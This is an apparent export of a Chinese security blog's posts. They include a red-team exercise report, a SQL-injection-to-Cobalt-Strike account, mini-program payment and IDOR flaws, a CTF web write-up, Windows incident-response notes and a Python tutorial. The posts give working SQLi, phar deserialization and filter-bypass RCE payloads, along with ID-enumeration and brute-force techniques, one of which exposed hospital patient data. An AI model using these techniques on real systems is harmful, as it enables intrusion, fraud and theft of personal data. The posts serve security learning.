[{"title":"某次市护总结","url":"/2023/08/01/%E6%9F%90%E6%AC%A1%E5%B8%82%E7%BA%A7hw%E6%80%BB%E7%BB%93/","content":"某次市护总结免责声明本次测试均在有授权，且在现场符合要求的情况下进行测试，请大家切勿非法渗透。\n传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢\n查看评分标准，收集资产这次数据分给的比较高，所以重点是找数据\n思路分析\n0-nday攻击 内网横向 获取敏感数据 \n弱口令爆破OA以及其他后台系统\nsql注入拿到数据库权限\nwx公众号资产测试\n\n0x01 公众号入口现在大多数的web资产都部署有waf等设备，部分企业的小程序或者微信公众号可能会有所忽略，可以尝试从apk或者公众号以及小程序入手本次主要是从微信公众号获取挂号链接进行id遍历，从而获取到整个医院的所有数据 其中身份证、手机号、姓名以及病例信息等。\n\nPOST /WxApp/xxx HTTP/1.1Host: x.x.x.xConnection: closeContent-Length: 620Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/6.8.0(0x16080000) MacWechat/3.8.1(0x13080110) XWEB/30626 FlueContent-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: *Referer: *Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zhCookie: JSESSIONID=params=&#123;&quot;REQ_HEAD&quot;:&#123;&quot;TRAN_CODE&quot;:&quot;xxx&quot;&#125;,&quot;REQ_BODY&quot;:&#123;&quot;tradeType&quot;:&quot;xxx&quot;,&quot;InHead&quot;:&#123;&quot;BusinessNumber&quot;:&quot;xxx&quot;,&quot;TerminalNumber&quot;:&quot;xxx&quot;,&quot;CooperationUnit&quot;:&quot;xxx&quot;&#125;,&quot;InBody&quot;:&#123;&quot;PatientId&quot;:&quot;xxx&quot;,&quot;BeginApplyTime&quot;:&quot;2023-x-x 00:00:00&quot;&#125;&#125;&#125;&amp;time=xxx&amp;sign=xxxx\n\n点击查询，抓包其中PatientId参数可控，可以遍历id，从而获取其他用户数据 由于参数过大，这里只遍历后5位，证明存在即可。\n\n查看响应\n\n\n可以看到门诊数据身份证等敏感信息。修改id可以达到遍历全院所有医患数据。\n0x02 暴力破解YYDS暴力破解常见思路\n无验证码\n验证码可复用\n提示账户不存在&#x2F;密码错误\n前端校验 修改返回码\n传输加密 （这种需要js逆向分析）\n\n无验证码模式针对无验证码的模式，我的思路一般是直接字典一把梭哈 用户可以利用常见的 admin test ceshi 123 sysadmin等\nfuzz字典推荐 ：https://github.com/TheKingOfDuck/fuzzDicts/tree/master \n密码可以先跑弱口令，无果可以尝试生成社工字典。github一搜就有一大堆\n\n我个人喜欢用 https://github.com/zgjx6/SocialEngineeringDictionaryGenerator\n\n验证码复用这种其实遇到的其实蛮多的，很多时候有的师傅看到验证码就直接跳过了，其实很多时候的验证码是可以直接复用爆破的，也有的是删除验证码字段即可绕过，思路就和无验证码是一样的。\n账户不存在&#x2F;密码错误\n\n这种是我最喜欢的了，这种是首先跑一遍用户字典，密码我通常会填123456 然后看回显。回显密码错误的就直接搞个大的密码字典直接跑，有时候运气好，还能跑出来几个123456 密码的用户\n案例这里遇到的是一个医院的OA系统\n以前爆破OA从来没有成功过\n\n后面发现是自己姿势不对，跑字典的时候害怕太慢了，所以跑了小一会就直接放弃跑路了\n其实不然，很多时候等待字典跑完可能会有惊喜，我用的是一个爆破OA账户的字典，有差不多2w条，抱着不会成功的态度，跑着就丢在那里了，测完另外几个才想起这里还在跑，然后回来发现有个用户提示密码错误，然后手动测了一下几个弱口令，然后123进去了\n\n这里密码base64了一下 也算是加密传输中的一种，不过太简单了，这种bp也可以直接跑。\n\n这里直接拿到4个账号，然后可以直接对这4个账号进行遍历密码爆破，最后成功进入后台\n\n前端校验这种有，但是不咋多 常见的就是去前端js查看正确返回的响应码是多少，然后拦截返回包，直接修改，有的是改true 然后删除一些msg 什么的，\n废话不说 直接上案例\n\n正常情况错误返回500，还有其他的信息 修改500为200  登录成功\n\n\n成功进入后台，也能获取到数据。\n\n0x03 0-nday思路就是 多总结收集常见的OA以及每年HW爆出来的常见的利用漏洞\n例如 OA  利用常见的OA利用工具进行利用，或者自己有的0day或者未公开利用的1day啥的。 然后再进入内网横向，翻一翻配置文件什么的。\n\n这里大佬也是直接穿越了三个网络 由互联网-&gt;教育网-&gt;内网\n另外，旁边大佬还掏了个图书馆的0day 没好意思要 hh\n0x04 互联网虚拟云桌面这里也是运气好，直接用弱口令就进了云桌面。\n\n直接上线cs读了密码，起代理远程控制连接，也是拿到了财务管理系统的权限 拿到了不少数据\n\n同时还扫到内网几个ms17010\n总结以上内容仅代表个人看法和观点，不足的地方还望各位大佬指正。\n另外还有不少成果处理太麻烦就不写了，还有是依一些是大佬的成果，我写出来也不好，hh 主要是分享一下个人的一些心得和思路。\n总之是跟着大佬学到了不少东西，不论是外网打点，还是内网的一些横向手段。大佬总是很低调，说话也很谦虚。只是在某个不经意之间，就直接偷偷拿了shell。\n\n\n\n总之，学无止境，永远不要停止脚步！\n","categories":["攻防演练","红队"],"tags":["攻防演练"]},{"title":"从sql注入到远程登录的简单利用","url":"/2023/06/01/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/","content":"从sql注入到远程登录的简单利用很近没写文章了，来水水文章。请大家遵守网络安全法，切勿非法渗透。本文漏洞已报告给学校。\n最近收集了一些内网的资产，遇到一个有意思的系统，然后就随便搞了玩玩。比较简单，大佬勿喷。\n\n首先来一手弱口令，提示用户密码错误，哦豁，没戏了，弱口令进不去，直接放弃。开个玩笑，尝试一下闭合，发现报错，\n\n发现报错，\n\n接着我试了一下admin’– admin 万能密码，登录成功。\n\n成功进入系统那么可以肯定这里是有注入的，直接sqlmap一把梭哈，\n\n发现是sqlserver ，直接–os-shell\n\n然后web投递上线cs 上线提权 \n\n再利用插件获取明文密码 administrator  xxxxx\n然后登录 这里管理员改了一下登录的端口 \t27020 \n\n登录成功。但是想了想，没拿到密码，还想进一步，翻了下文件，看到备份文件\n\n看到有密码，但是连接错误\n\n改用windows身份验证，可以直接登录\n\n成功登录，然后选中刚刚的数据库，新建查询，\n\n密码md5加密过了，凭经验，可以知道，好几个密码是123456  \n\n选择登录  登录成功\n\n","categories":["渗透测试","漏洞挖掘"],"tags":["web渗透"]},{"title":"某小程未授权+支付逻辑漏洞","url":"/2023/05/01/%E6%9F%90%E5%B0%8F%E7%A8%8B%E6%9C%AA%E6%8E%88%E6%9D%83+%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","content":"某小程未授权+支付逻辑漏洞打开小程序主页 点击个人 抓包发现有id \n\n 点击余额 \n发现有id  发送repeater进行修改尝试\n\n自己余额id为0 修改其他id\n\n成功返回余额，直接拼接浏览器访问，发现也可以拿到数据 \n\n修改di为1 发现也存在，为了验证存在，直接爆破后四位，1111-9999 发现可以完全遍历 \n\n点击余额明细的时候，也可以抓包，可以看别人的\n\n\n经过测试，发现基本所有功能点都存在未授权 \n发现一个有意思的地方 他这连充值都是未授权的，也就是可以未授权用它一卡通余额里的钱给他充到小程序里面去，\n\n\n\n 历史订单处 &#x2F;order&#x2F;list?company_id&#x3D;15&amp;page&#x3D;1&amp;openid&#x3D;oH0xd49hFv19wWTowa7NWRWU4Sl0&amp;member_id&#x3D;227295&amp;charge_status&#x3D;complete\n其他的几处就不详细展示了\n\n","categories":["漏洞挖掘","渗透测试"],"tags":["web渗透"]},{"title":"记一次小程序支付逻辑漏洞测试","url":"/2023/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/","content":"记一次小程序支付逻辑漏洞测试闲来无事，无聊至极，羊了个羊很火，奈何太菜，通宵达旦，未能过关，于是另寻捷径。bp+proxifier搞一搞，抓到包直接重放。\nT值应该是自己的token，换成自己的，然后干嘛，然后直接intruder开干啊，截图装逼啊，还等啥。于是呢 小小的刷了一波各位看个乐呵就行。完了后转手看到一个别的小程序，里面有个商城，心想：看看有无支付逻辑漏洞试一试。试试就逝世。于是忙碌了一天的S师傅开心的打开了某小程序，开心的换了一换那里的纸巾，然后 一不小心 改了他的价格 0.01，给我吓一跳wc，我要暴富了啊，还等什么，直接开干啊没想到啊，正当我开心的时候，结算的时候给了我耳光。16.9 我这种穷孩子怎么可能买得起嘛。所以我一不小心，真的是一不小心的。我寻思0.01总得支付吧，谁曾想，我还没付钱呢。直接给我成功了，吓死个人，md白嫖？我怎么可能是这种人。吓得我直接退货了。然后和客服沟通了一下下 ，我生怕他给我退钱过来了，咱可是遵纪守法的好公民啊，这周末能行呢。运营小姐姐打电话来和我说感谢，还好不是喝茶。就告一段落了，所以各位铁汁们，注意网络安全法，千万要做一个遵纪守法的好公民啊\n","categories":["漏洞挖掘","渗透测试"],"tags":["web渗透","小程序","逻辑漏洞"]},{"title":"python 继承和多态","url":"/2023/08/18/python%20%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/","content":"python 继承和多态什么是继承？在生活中，大家都应该听过这个词，比如儿子继承他老子的财产，那么在python中也有继承，但是有不少人比较难理解继承这个东西。在python，所有的类都默认继承object类，因此object类也被称为基类,其他的类称为派生类,在python中继承就是 子类可以继承父类中的所有的非私有方法\n\n什么是私有方法?\n\n是指在 Python 的面向对象开发过程中，对象的某些方法或者称为函数只想在对象的内部被使用，但不想在外部被访问到这些方法或函数。即：私有方法是对象不愿意公开的方法或函数。同理 私有属性也是类同那么用一个简单的代码来理解一下\n# 1. 定一个一个公共性类 (class   Person():    # 定义__init__初始化方法    def __init__(self,name,age,adress):        self.name = name        self.age = age        self.adress = adress    def eat(self):        print(&#x27;i can eat food!&#x27;)    def speak(self):        print(&#x27;i can speak!&#x27;)# 定义个性类class Teacher():    def __init__(self,name,age,adress):        self.name = name        self.age = age        self.adress = adress    def eat(self):        print(&#x27;i can eat food!&#x27;)    def speak(self):        print(&#x27;i can speak!&#x27;)\tdef __write(self):\t\tprint(&#x27;i can wirte&#x27;)# 定义个性类 Student  继承person类，发现也可以调用成功class Student(Person):    passp = Person(&#x27;snail&#x27;,21,&#x27;贵州&#x27;)teacher = Teacher(&#x27;tom&#x27;,10,&#x27;贵州&#x27;)s1 = Student(&#x27;xiaowu&#x27;,87,&#x27;四川&#x27;)s1.eat()s1.speak()# 继承可以继承父类中的所有非私有方法， 也就是这里的`__write`方法将不会被继承 `__` 是python中私有方法的语法定义 \n那么执行后你会发现即使Student类中并没有定义eat()方法和speak()方法 但是也同样能够输出 这就是继承继承的语很简单 直接在类后面的括号里面跟上需要继承的类即可。\n例如：\nclass B(object):    pass  # 这里自己写需要的方法class A(B):    passa = A()a.B中所有公共方法。\n那么我们想在父类继承来的方法里面执行子类的特有的代码怎么办,这里就引入了新的名词重写\n那么什么是重写呢？\n\n我的理解是，从父类继承过来，只有父类的方法和属性，那么我自己想要在父类的基础上面修改方法和属性该怎么办呢，那么重写就是用来解决这个问题的。  也就是继承后，可以进行修改继承来的方法，  如果有系统的属性和方法，进行重写， 也就是从父类继承来的方法会进行重新定义。例：\n\nclass Animals(object):    def eat(self):        print(&#x27;i can eat&#x27;)    def call(self):        print(&#x27;i can call phone &#x27;)class Dog(Animals):    def eat(self):        print(&#x27; i like eat gutouts&#x27;)class Cat(Animals):    def eat(self):        print(&#x27;i can 捉老鼠&#x27;)wangcai = Dog()wangcai.eat()wangcai.call()miao = Cat()miao.eat()miao.call()\n运行后便可以理解什么是重写了，也就是不同的类继承同一个父类后，进行方法的重写，之后执行的结果与父类和另外的子类的结果不同。那么问题又来啦，既然我们对父类的方法进行重写了，那如果我们还需要调用父类的方法，那该怎么办呢，对此，python引入了super()方法 \n\nsuper():调用父类的方法或属性,完整写法: super().属性 或者super.方法 就可以完成调用了\n\n调用例字:\nclass Car(object):    def __init__(self, brand, model, color):        self.brand = brand        self.model = model        self.color = color    def run(self):        print(&#x27;i can run&#x27;)class GasolineCar(Car):    def __init__(self, brand, model, color):        super().__init__(brand, model, color)    def run(self):        print(&#x27;i can run with gas&#x27;)class ElectricCar(Car):    def __init__(self, brand, model, color):        super().__init__(brand, model, color)        # 代表电池电量。        self.battery = 70    def run(self):        print(f&#x27;i can run whith electric,remind&#123;self.battery&#125;&#x27;)bmw = GasolineCar(&#x27;宝马&#x27;, &#x27;x5&#x27;, &#x27;白色&#x27;)bmw.run()tesla = ElectricCar(&#x27;特斯拉&#x27;, &#x27;model3&#x27;, &#x27;红色&#x27;)tesla.run()\n这里用车来做例子，我们发现我们这里都是用的父类的方法对车进行初始化的。也就是我们在子类中并没有重新写初始化的方法。而是调用父类中的。\n1.什么是多态多态指的是一类实物有多种形态，定义 多态是一种使用对象的方式，子类重写父类方法，调用不同子类对象的相同父类方法，可以产生不同的执行结果；\n\n多态依赖继承\n子类方法必须要重写父类方法。首先定义一个父类，其可能拥有多个子类对象，当我们调用一个公共方法时，传递的对象不同，则返回的结果不同。好处，调用灵活，有了多台，可以更容易编写出通用的代码，做出通用的编程，以适应需求的不断变化。、\n\n不同对象访问相同方法，返回不同结果  就是多态\n代码实现。多态可以基于继承，也可以不基于继承。\nclass Fruit(object):    def makejuice(self):        print(&#x27;i can make juice &#x27;)class Apple(Fruit):    def makejuice(self):        print(&#x27;i can make  apple juice &#x27;)class Banana(Fruit):    def makejuice(self):        print(&#x27;i can make Banana juice &#x27;)class Orange(Fruit):    def makejuice(self):        print(&#x27;i can make Orange juice &#x27;)# 利用多态。  定义一个service  公共方法接口def service(obj):    obj.makejuice()# apple = Apple()# apple.makejuice()  # 以往的方式，需要用一个调用一个# banana = Banana()# banana.makejuice()  # 橘子也是 一样# orange = Orange()# orange.makejuice()# 利用接口apple = Apple()banana = Banana()orange = Orange()for i in (apple,banana,orange):    service(i)\n这里的service就是多态的体现。\n","categories":["Python"],"tags":["Python","爬虫"]},{"title":"Windows的应急","url":"/2023/08/18/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","content":"Windows的应急学习过程中看到师傅文章，所以顺便做了个思维导图 师傅太强了 原文链接已放文末。\n常见的应急响应事件分类。web入侵\n网页挂马\n\n主页篡改\n\nwebshell\n\n\n系统入侵\n病毒木马\n\n勒索病毒\n\n远控木马\n\n\n网络攻击\nddos\n\ndns劫持\n\narp欺骗\n\n\nwindows入侵排查1.1 检查账号安全性\n\n检查系统账号安全性。\n\n\n\n查看服务器是否存在可疑或者新增账号\n\n\n检查方法：\n\nWin+R打开运行窗口，输入lusrmgr.msc，查看是否有新增可疑的账号，如果有管理员群组里的新增账户，请立即禁用或者删掉\n\n\n管理员群组：\n\nAdministrators\n\n\n\n\n\n查看服务器是否存在隐藏账号，克隆账号等。\n\n\n检查方法：\n\n打开注册表：查看对应键值\n\n第一步：Win+R打开运行窗口，输入regedit打开注册表编辑器\n第二步：选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM，默认无法查看\n第三步：右击SAM，权限，选择当前用户(一般是Administrator),将权限勾选为完全控制，然后确定并且关闭注册表\n第四步：选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users;\n第五步：在Names项下可以看到实例所有用户名\nTips:如果出现本地账户中没有的账户，即为隐藏账户，在确认为非系统用户的前提下，可删除此用户\n\n\n使用D盾_web查杀工具，集成了对克隆账号的检测功能\n\n\n\n\n\n结合日志，查看管理员登录时间、用户名是否存在异常。\n\n方法：\n\n\nWin+R打开运行窗口，输入eventvwr.msc，打开事件查看器。\n\n\n\n导出Windows日志–安全，利用Log Parser进行分析\n\n\n\n\n\n\n\n1.2 检查异常端口、进程\n\nnetstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED状态\n\n\n\n根据netstat 确定PID，再通过tasklist | findstr “PID” 定位进程\n\n\n\nWin+R打开运行窗口，输入msinfo32，在【软件环境】-&gt; 【正在运行的任务】通过PID和进程名定位，就可以看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。\n\n\n\n在我们想要杀死进程的时候，可能因为进程绑定了系统服务，无法杀死，通过tasklist &#x2F;svc 查看进程对应的服务。Win+R打开运行窗口，输入serivces.msc，关闭对应服务，然后在杀死进程。\n\n\n\n查看Windows服务所对应的端口：\n\n\n%system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services (一般%system%就是C:\\Windows)\n\n\nTips：当我们通过第3步确定落地文件之后，可以将可疑文件上传到威胁情报社区去做威胁情报检测。\n\n\n1.3 检查启动项、计划任务、服务\n1、检查服务器是否有异常的启动项\n\n\n登录服务器，单机【开始】-&gt; 【所有程序】-&gt;【启动】，默认情况下此目录是一个空目录，确认是否有非业务程序在该目录下\n\n\n\nWin+R打开运行窗口，输入msconfig，查看是否存在命名异常的启动项目，是则取消勾选该启动项，并到命令中显示的路径除文件\n\n\n\nWin+R打开运行窗口，输入regedit打开注册表，查看开机启动项是否正常，注册表项如下：\n\n\nHKEY_CURRENT_USER\\SOFTWARE\\Micorsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Micorsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Micorsoft\\Windows\\CurrentVersion\\RunOnce检查右侧是否有启动异常的项目，有则删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。\n\n\n\n利用安全软件查看启动项、开机时间管理等\n\n\n\nWin+R打开运行窗口，输入gpedit.msc打开本地组策略编辑器，单机【Windows】-&gt;【脚本(启动&#x2F;关机)】-&gt;【启动】&#x2F;【关机】查看是否有启动项\n\n\n\n\n2、检查计划任务\n\n3、服务自启动\n\n\n1.4 检查系统相关信息\n1、查看系统版本以及补丁信息\n\n检查方法：Win+R打开运行窗口，输入systeminfo，查看系统信息\n\n\n2、查找可疑目录及文件\n\n\n查看用户目录，新建账号会在这个目录生成一个用户目录\n\n\nWindows Server 2003 : C:\\Documents and Settings\nWindows Server 2008R2 : C:\\Users\\\n\n\n\nWin+R 打开运行窗口，输入%UserProfile%\\Recent，分析最近打开文件\n\n\n\n在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件\n\n\n\n回收站、浏览器下载目录、浏览器历史记录\n\n\n\n修改时间在创建时间之前的为可疑文件\n\n\n\n\n3、得到发现Webshell、远控木马的创建时间，找同一时间范围内创建的文件\n\n\n利用Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件\n\n\n\n利用计算机自带的文件搜索功能，指定修改时间进行搜索\n\n\n\n\n\n1.5 自动化查杀\n1、病毒查杀\n\n检查方法：下载安全软件，更新最新病毒库，进行全盘扫描\n\n\n2、webshell查杀\n\n检查方法：选择具体的站点路径进行webshell查杀，建议使用两款或者多款查杀工具同时查杀，可以相互补充规则库的不足\n\n\n\n1.6 日志分析\n1、系统日志\n\n\n前提：开启审核策略，若日后出现系统故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵的信息等。\n\n\n\nWin+R打开运行窗口，输入eventvwr.msc，打开事件查看器\n\n\n\n导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析\n\n\n\n\n2、web访问日志\n\n\n找到中间件的web日志，打包到本地方便进行分析\n\n\n\nWindows推荐使用EmEditor进行日志分析；Linux推荐使用shell命令组合查询分析\n\n\n\n\n常见日志存放路径\n\n1、apache服务器\n\nWindows : &lt;Apache安装目录&gt;\\logs\\access.log\nLinux :&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access.log\n若不存在，参考Apache配置文件httpd.conf中相关配置\n\n\n2、tomcat服务器\n\n日志文件通常位于Tomcat安装目录下的logs文件夹内，若不存在，则参考Tomcat配置文件Server.xml中的相关配置 ，如：\n\n\ndirectory&#x3D;”logs” prefix&#x3D;”localhost_access_log.”\nsuffix&#x3D;”.txt”\npattern&#x3D;”common” resolveHosts&#x3D;”false”&#x2F;&gt;\n\n\n\n\n3、IIS服务器\n\n默认位置：%systemroot%\\system32\\logfiles\\ 可自由设置\n默认日志命名方式：ex+年份的末两位数字+月份+日期+.log\n\n\n4、Nginx\n\n日志存储路径在Nginx配置文件中，其中：\nAccess_log变量规定了日志存放路径与名字，以及日志格式名称，默认值”access_log”\n\n\n5、Jboss\n\n默认不做访问日志记录\n修改${JBOSS_HOME}&#x2F;server&#x2F;default&#x2F;deploy&#x2F;jbossweb.sar&#x2F;server.xml（不同版本文件位置不一样）\n日志保存在${JBOSS_HOME}&#x2F;server&#x2F;default&#x2F;log&#x2F;下，前缀为：localhost_access_log\n\n\n\n\n\n关于配置文件\nTomcat: server.xml 会有服务器端口配置，日志配置等\nApache: httpd.conf是apache主要配置文件，包括端口，模块启用，日志配置等\nNginx: nginx.conf是主要配置文件，会有端口，重写，代理等配置，也会有日志配置等。\nIIS: web.config 是主要配置文件，通过IIS界面修改的配置会保存到web.config里，包括重写等操作，日志配置一般不变，通过界面就可查看\n\n参考链接： https://blog.csdn.net/weixin_44727454/article/details/125605281下面附上思维导图 \n我好菜  太废物了  淦\n\n","categories":["攻防演练","蓝队"],"tags":["蓝队","应急"]},{"title":"内存马的一些粗浅的思维导图总结","url":"/2023/08/18/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%B2%97%E6%B5%85%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%80%BB%E7%BB%93/","content":"感觉自己太废物了。麻了\n\n"},{"title":"Cobalt Strike 流量特征","url":"/2023/08/18/Cobalt%20Strick%20%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/","content":"Cobalt Strike 流量特征总结来源于网上资料， 有错的地方欢迎各位大佬指正。\n简介简介：Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， A-team详细介绍使用网址。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动特征默认端口 50050SSL 证书流量特征：\nkeystore type: jks\nAlias name: cobaltstrike\nOwn: CN&#x3D;Major Cobalt Strike\nIssuer: CN&#x3D;Major Cobalt Strike\n\n默认 C&#x2F;S 端通讯证书：字段和固定哈希值识别可以看到beacon的通信对比正常的http流量，CS的http通信流量具有以下几个特征：心跳包特征\na)\t间隔一定时间，均有通信，且流级上的上下行数据长度固定；\n\n域名&#x2F;IP特征\na)\t未走CDN、域前置的，域名及IP暴露\nb) 走CDN、域前置的，真实IP会被隐藏；\n\n指令特征\na)\t下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。\n\n\nb)\t指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。\n\n\nc)\t不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。\n\n\n\n数据特征\na)\t在请求的返回包中，通信数据均隐藏在jqeury*.js中。\n\n去除特征的方法修改默认端口50050修改默认ssl证书\nkeytool -list -v -keystore cobaltstrike.store                                           \n参考链接：https://www.cnblogs.com/CoLo/p/14518441.html#0x00-%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%9A%84cs\n\n修改profile\n","categories":["攻防演练","蓝队"],"tags":["流量分析"]},{"title":"文件包含&文件其他操作&RCE思维导图","url":"/2023/08/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C&RCE%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","content":"文件包含&amp;文件其他操作&amp;RCE思维导图\n\n\n"},{"title":"2022第五空间-web部分wp复盘总结","url":"/2023/05/01/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-web%E9%83%A8%E5%88%86wp%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/","content":"打了一天，麻了，大佬tql，这次get到了不少东西，一是一个不太常见的宽字节注入，我是真的没想到，而且后面也是看了wp理解了好一会才弄明白。\n0x01:题目是一个登录框，但是基本上是过滤掉了所有的常见注入的关键词。实在是没思路，后面看了大佬wp，才发现是宽字节注入，同时还要利用虚拟表，同时还有mysql的hex编码。payload：\n\nadmin%df%27%09ununionion%09selselectect%091,2,0x6531306164633339343962613539616262653536653035376632306638383365#&amp;password&#x3D;123456\n\n其中 0x6531306164633339343962613539616262653536653035376632306638383365 为 password&#x3D;123456d的hex(md5(password))  利用双写+宽字节构造payload。123456加密后的md5：e10adc3949ba59abbe56e057f20f883e因为宽字节的问题所以利用mysql 的hex编码一下：\n0x02:一个phar读取flag的操作，遇到这题的时候，phar差不多已经忘光了，首先扫目录得到www.zip 拿到源码进行简单的审计：开始以为是文件上传，后面一看发现是构造phar直接读。得到class.php \n&lt;?phpclass upload&#123;    public $filename;    public $ext;    public $size;    public $Valid_ext;    public function __construct()&#123;        $this-&gt;filename = $_FILES[&quot;file&quot;][&quot;name&quot;];        $this-&gt;ext = end(explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]));        $this-&gt;size = $_FILES[&quot;file&quot;][&quot;size&quot;] / 1024;        $this-&gt;Valid_ext = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);    &#125;    public function start()&#123;        return $this-&gt;check();    &#125;    private function check()&#123;        if(file_exists($this-&gt;filename))&#123;            return &quot;Image already exsists&quot;;        &#125;elseif(!in_array($this-&gt;ext, $this-&gt;Valid_ext))&#123;            return &quot;Only Image Can Be Uploaded&quot;;        &#125;else&#123;            return $this-&gt;move();        &#125;    &#125;    private function move()&#123;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$this-&gt;filename);        return &quot;Upload succsess!&quot;;    &#125;    public function __wakeup()&#123;        echo file_get_contents($this-&gt;filename);    &#125;&#125;class check_img&#123;    public $img_name;    public function __construct()&#123;        $this-&gt;img_name = $_GET[&#x27;img_name&#x27;];    &#125;    public function img_check()&#123;        if(file_exists($this-&gt;img_name))&#123;            return &quot;Image exsists&quot;;        &#125;else&#123;            return &quot;Image not exsists&quot;;        &#125;    &#125;&#125;\n\n构造payload：\n&lt;?phpclass upload&#123;    public $filename = &quot;/flag&quot;;&#125;#new Phar()这里定义了生成的phar文件的名字(这里定义的时候后缀是一定要.phar)#实际上生成后后缀名也可以改(比如awsl.awsl也行),标志该文件是phar文件的是下面的__HALT那里$phar =new Phar(&quot;awsl.phar&quot;); $phar-&gt;startBuffering();#这里XXX的内容随便写,注意后面的XXX如果不用;来和__HALT分割记得留个空格隔开(个人觉得后面XXX还是写个PHP语句好,省点麻烦)#__HXXXX(注释里直接用全称会被识别)这一节在这个setStub这里必须保证这个为结尾而且不可省,标志这个为phar文件$phar-&gt;setStub(&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;); #把要序列化的变量申明好(这里只知道能放序列化的一个变量,不知道怎么放多个(或许单个文件只能放一个序列化的变量))$a = new upload();#将目标变量存入(这里自动把它序列化了)$phar-&gt;setMetadata($a); #这里会按照文件名,文件内容的形式打包到phar文件中,当使用phar://awsl.phar://test.txt就会类似用include包含后面定义的代码(这里文件名不影响是否解析 $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;\n\nphar反序列化知识点可以看一下这篇文章：利用phar扩展PHP反序列化漏洞\n放到本地运行一下，这里记得需要在你PHP版本目录下的php.ini文件里面把phar.readonly = off 这一行的注释给去掉，并且改成off在本地运行php后，目录下会生成一个.phar的文件 因为phar是可以随便修改为jpg png gif的，所以这里直接随便改个后缀，然后上传 再读取的时候 get传参 phar://upload/文件名.jpg 即可得到flag\n0x03:一个有趣的RCE题打开发现有个ping 操作。 结合经验猜测是rce，爆破一下账号密码，得到账号：admin 密码：admin123登录后发现一样的，也是ban掉了很多关键词，利用字典fuzz 一波 这里给大家推荐一个字典：Web Pentesting Fuzz 字典,一个就够了。这里看到 %0a可以绕过。这里利用tac%09index.php 查看源码发现这里过滤了好多命令，看到可疑的目录kylin 但是他把kylin给ban了，构造通配符直接进行flag的读取。payload:\n\n?ip&#x3D;%0Acd%09ky?in%0aca\\t%09*成功得到flag：构造其他payload可以大家可以参考一下这篇：RCE漏洞之绕过\n\n总结：这次还是学到不少东西，最后成绩28，web队里师傅们ak了 但是最后那个sql注入我是现在还没看懂，所以就没总结了。收获蛮大的。扩展了不少的思路，get到了大佬平时的思路，rce的那题，读文件的时候，队里师傅写了个一句话木马上去，ban了那么多关键词，我是怎么也想不到怎么写上去的。按我平时的思路就是，利用常见的命令 例如echo命令写马，但ban掉了不少东西， 同时，/也被ban了，进目录是没法搞的。但是大佬的思路是啥，日志写马，日志写马倒也是想到过，可是我/给我ban掉了，当时就没想到怎么给进目录，那么自然也就没法写马了，完了请教大佬的时候，大佬给我的是这样的：思路是这样的，但是这个绕过属实是骚操作了。另外还get到一个思路，就是平常的rce 